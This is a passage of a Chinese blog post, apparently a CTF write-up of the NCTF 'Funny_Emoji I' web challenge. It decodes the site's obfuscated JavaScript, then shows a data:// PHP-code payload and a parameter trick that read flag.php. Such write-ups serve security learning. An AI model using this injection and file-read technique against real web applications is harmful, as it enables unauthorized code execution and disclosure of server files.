+<h2 id="Funny-Emoji-I"><a href="#Funny-Emoji-I" class="headerlink" title="Funny_Emoji I"></a>Funny_Emoji I</h2><p>这题目特别有意思，里面表情包可好玩了！<br>打开链接，发现有个emoji功能，但是需要登入，既然有注册页面那就先注册，进去emoji功能界面:<br><img src="/images/22/19.png" alt=""><br>发现我们可以选择图片，下面有个文本框可以任意输入，点击旁边的按钮就能得到表情包。不过在查看页面源代码的时候发现了这样一点:<br><img src="/images/22/20.png" alt=""><br>这会远程加载一个文件，我们可以访问一下，尝试更改参数发现了，image.php会根据我们传入的name参数改变图片样式。<br>接着没啥思路了…..不过刚刚查看源码的时候，发现了一段js混淆加密的代码，解码发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function encccccrypt(s) &#123;</span><br><span class="line">    flag = &apos;&apos;;</span><br><span class="line">    for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class="line">        flag += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length))</span><br><span class="line">    &#125;</span><br><span class="line">    return btoa(flag)</span><br><span class="line">&#125;</span><br><span class="line">var key = &apos;nctf23333&apos;;</span><br><span class="line"></span><br><span class="line">function hold_data(s) &#123;</span><br><span class="line">    return s.replace(&apos;\n&apos;, &apos;%0a&apos;)</span><br><span class="line">&#125;</span><br><span class="line">var enccccrypt = atob;</span><br><span class="line"></span><br><span class="line">function get_images() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    i.src = &quot;images/&quot; + s.options[index].value + &quot;.jpg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_my_image() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima2&apos;);</span><br><span class="line">    var t = document.getElementById(&apos;text&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    var im_name = s.options[index].value;</span><br><span class="line">    var im_text = t.value;</span><br><span class="line">    var ptl = encccccrypt(enccccrypt(&quot;ZGF0YTovL3RleHQvcGxhaW4s&quot;));</span><br><span class="line">    var data = hold_data(im_text);</span><br><span class="line">    i.src = &quot;image.php?name=&quot; + im_name + &quot;&amp;data=&quot; + data + &quot;&amp;ptl=&quot; + ptl</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先把里面可疑一段base64解码，发现:<br><img src="/images/22/21.png" alt=""><br>emmmm，这貌似可以通过data协议写入shell。按照它加密的方式我们尝试这样的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是回显不太对：<br><img src="/images/22/22.png" alt=""><br>按照原来的字符输出了，这里让我想到一篇文章，说的是如果使用file_put_contents()函数测试，那么会按照原来的字符串输出，所以尝试读一下flag.php，因为data参数的值是接在ptl参数后的，所以data参数不传值，flag到手:<br><img src="/images/22/23.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/28/NCTF赛后wp-以及复现未做出的题目/" data-id="cjp0vwdb50007bkvj6jadetha" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/11/18/近期比赛的归纳总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">近期比赛的归纳总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle">记录日常所学</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>28</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
